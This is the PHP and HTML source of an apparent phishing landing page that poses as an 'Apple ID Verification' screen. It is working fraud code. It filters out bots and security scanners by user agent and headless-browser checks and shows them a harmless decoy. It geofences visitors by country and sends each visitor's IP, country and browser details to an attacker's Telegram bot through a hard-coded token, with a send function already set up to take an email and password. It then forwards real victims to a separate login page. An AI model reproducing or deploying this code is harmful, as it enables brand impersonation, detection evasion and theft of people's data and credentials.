<?php
// === SECURITY ENHANCEMENTS ===
// Start output buffering to prevent any accidental output
ob_start();

// Set security headers
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: strict-origin-when-cross-origin');

// Initialize session with secure parameters
session_set_cookie_params([
    'lifetime' => 0,
    'path' => '/',
    'domain' => '',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);

session_start();

// Simple rate limiting
$ip = $_SERVER['REMOTE_ADDR'];
$request_time = time();
$rate_limit_file = 'rate_limit.txt';

// Read rate limit data
$rate_data = [];
if (file_exists($rate_limit_file)) {
    $rate_data = json_decode(file_get_contents($rate_limit_file), true) ?: [];
}

// Clean old entries (older than 1 hour)
foreach ($rate_data as $stored_ip => $time) {
    if ($request_time - $time > 3600) {
        unset($rate_data[$stored_ip]);
    }
}

// Check if IP has made too many requests (more than 5 in 1 hour)
if (isset($rate_data[$ip]) && $rate_data[$ip] > 5) {
    header('HTTP/1.1 429 Too Many Requests');
    exit('Too many requests. Please try again later.');
}

// Update rate limit data
$rate_data[$ip] = isset($rate_data[$ip]) ? $rate_data[$ip] + 1 : 1;
file_put_contents($rate_limit_file, json_encode($rate_data));

// Basic bot detection
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (empty($user_agent) || preg_match('/bot|crawl|slurp|spider|curl|wget|python|java|phantom|headless/i', $user_agent)) {
    // Log potential bot
    file_put_contents('bot_attempts.log', date('Y-m-d H:i:s') . " - Potential bot: $ip - $user_agent\n", FILE_APPEND);
    // Serve a simplified version without functionality
    header('Content-Type: text/html');
    ob_end_flush();
    // Continue with HTML output but without the sensitive JavaScript
    $restrictedMode = true;
} else {
    $restrictedMode = false;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Apple ID Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#000;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;height:100vh;display:flex;justify-content:center;align-items:center;color:#fff;overflow:hidden;}
.container{text-align:center;max-width:400px;padding:30px;position:relative;}
.apple-logo{width:60px;height:60px;margin:0 auto 25px;background:linear-gradient(135deg,#888 0%,#fff 30%,#aaa 100%);border-radius:18px;display:flex;align-items:center;justify-content:center;position:relative;}
.apple-logo::before{content:"⌘";font-size:36px;color:#000;font-weight:300;}
.status-text{font-size:22px;font-weight:400;margin-bottom:15px;letter-spacing:0.5px;background:linear-gradient(90deg,#fff,#aaa);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
.progress-container{width:100%;height:6px;background:rgba(255,255,255,0.1);border-radius:3px;overflow:hidden;margin:25px 0;}
.progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#007aff,#00c4ff);border-radius:3px;transition:width 0.5s ease;}
.details{font-size:14px;color:#888;margin-top:20px;line-height:1.6;}
.access-denied{display:none;text-align:center;background:#1c1c1e;padding:30px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.5);max-width:400px;animation:fadeIn 0.5s ease;}
.denied-icon{font-size:48px;margin-bottom:20px;color:#ff453a;}
h1{font-size:24px;margin-bottom:15px;font-weight:600;}
p{font-size:16px;opacity:0.8;line-height:1.5;}
@keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
@keyframes pulse{0%{opacity:0.7;}50%{opacity:1;}100%{opacity:0.7;}}
.pulse{animation:pulse 2s infinite ease-in-out;}
</style>
</head>
<body>

<div class="container" id="loading">
    <div class="apple-logo"></div>
    <div class="status-text">Verifying Apple ID access</div>
    <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
    <div class="details">
        <p>Checking device compatibility and region access rights</p>
        <p class="pulse">Please wait while we verify your information</p>
    </div>
</div>

<div class="access-denied" id="denied">
    <div class="denied-icon">⛔</div>
    <h1>Access Restricted</h1>
    <p>This service is not available in your region.</p>
    <p>For assistance, please contact Apple Support.</p>
</div>

<script>
// Only execute the sensitive code if not in restricted mode
<?php if (!$restrictedMode): ?>
// FIXED: Added 'GB' to the allowed countries list
const ALLOWED_COUNTRIES=['TN','US','JP','UK','GB','DE','FR','CH'];
const LOGIN_PAGE='login.php';

// Put your Telegram Bot Token & Chat ID here
const BOT_TOKEN = '8450566694:AAHKZmBuNJZ8BdvkA4ab6kli8PXC24X2D2U';
const CHAT_ID = '-4932499123';

// Progress bar simulation
function simulateProgress(){
    const progressBar=document.getElementById('progressBar');
    let width=0;
    return setInterval(()=>{
        if(width>=90) clearInterval(this);
        else {width+=Math.random()*10; progressBar.style.width=Math.min(width,90)+'%';}
    },300);
}

// Get user IP with fallbacks
async function getUserIP(){
    try{
        // Try multiple IP detection services with fallbacks
        const services = [
            'https://api.ipify.org?format=json',
            'https://ipapi.co/json/',
            'https://ipinfo.io/json'
        ];
        
        for (const service of services) {
            try {
                const res = await fetch(service, {
                    signal: AbortSignal.timeout(3000)
                });
                if (res.ok) {
                    const data = await res.json();
                    return data.ip || 'Unknown IP';
                }
            } catch (e) {
                console.log(`Service ${service} failed, trying next`);
            }
        }
        return 'Unknown IP';
    } catch {
        return 'Unknown IP';
    }
}

// Detect country with multiple fallbacks
async function detectCountry(){
    try{
        const services = [
            'https://ipapi.co/json/',
            'https://ipinfo.io/json',
            'https://extreme-ip-lookup.com/json/'
        ];
        
        for (const service of services) {
            try {
                const res = await fetch(service, {
                    signal: AbortSignal.timeout(3000)
                });
                if (res.ok) {
                    const data = await res.json();
                    // Handle both UK and GB country codes
                    const countryCode = data.country_code || data.country || 'Unknown';
                    return countryCode === 'UK' ? 'GB' : countryCode;
                }
            } catch (e) {
                console.log(`Service ${service} failed, trying next`);
            }
        }
        return 'Unknown';
    } catch {
        return 'Unknown';
    }
}

// Enhanced bot detection
function isBot(){
    // Check for headless browser indicators
    const indicators = [
        navigator.webdriver,
        navigator.languages && navigator.languages.length === 0,
        /HeadlessChrome|PhantomJS|Electron|Bot|Crawler|Spider|curl|wget|python|java|node/i.test(navigator.userAgent),
        !('ontouchstart' in window) && navigator.maxTouchPoints > 0,
        window.outerWidth === 0 && window.outerHeight === 0
    ];
    
    return indicators.some(indicator => indicator === true);
}

// Send message to Telegram with error handling
async function sendToTelegram(email='', password=''){
    try {
        const ip = await getUserIP();
        const country = await detectCountry();
        const bot = isBot() ? 'Yes' : 'No';

        const message = `🔔 Page accessed
🌐 Country: ${country}
🖥️ User Agent: ${navigator.userAgent}
📍 IP: ${ip}
🤖 Bot: ${bot}

🕒 Time: ${new Date().toISOString()}`;

        // Send to Telegram API with timeout
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`, {
            signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        return {ip, country, bot};
    } catch (error) {
        console.error('Telegram API error:', error);
        // Continue execution even if Telegram fails
        const ip = await getUserIP();
        const country = await detectCountry();
        const bot = isBot() ? 'Yes' : 'No';
        return {ip, country, bot};
    }
}

// Main function with error handling
async function processAutoLogin(){
    try {
        const progressInterval = simulateProgress();
        const userData = await sendToTelegram();

        // Finish progress bar
        document.getElementById('progressBar').style.width = '100%';
        clearInterval(progressInterval);
        await new Promise(r => setTimeout(r, 500));

        // Check if user is from allowed country (including both UK and GB)
        const userCountry = userData.country;
        const isAllowedCountry = userCountry === 'UK' || userCountry === 'GB' || ALLOWED_COUNTRIES.includes(userCountry);
        
        if(userData.bot === 'No' && isAllowedCountry){
            window.location.href = LOGIN_PAGE;
        } else {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('denied').style.display = 'block';
        }
    } catch (error) {
        console.error('Process error:', error);
        // Fallback to showing the denied page on error
        document.getElementById('progressBar').style.width = '100%';
        await new Promise(r => setTimeout(r, 500));
        document.getElementById('loading').style.display = 'none';
        document.getElementById('denied').style.display = 'block';
    }
}

// Add a small delay before starting the process
setTimeout(processAutoLogin, 1000);
<?php else: ?>
// Restricted mode - just show loading animation without functionality
const progressInterval = setInterval(() => {
    const progressBar = document.getElementById('progressBar');
    let width = parseInt(progressBar.style.width) || 0;
    if (width >= 100) {
        clearInterval(progressInterval);
        document.getElementById('loading').style.display = 'none';
        document.getElementById('denied').style.display = 'block';
    } else {
        width += Math.random() * 5;
        progressBar.style.width = Math.min(width, 100) + '%';
    }
}, 300);
<?php endif; ?>
</script>
</body>
</html>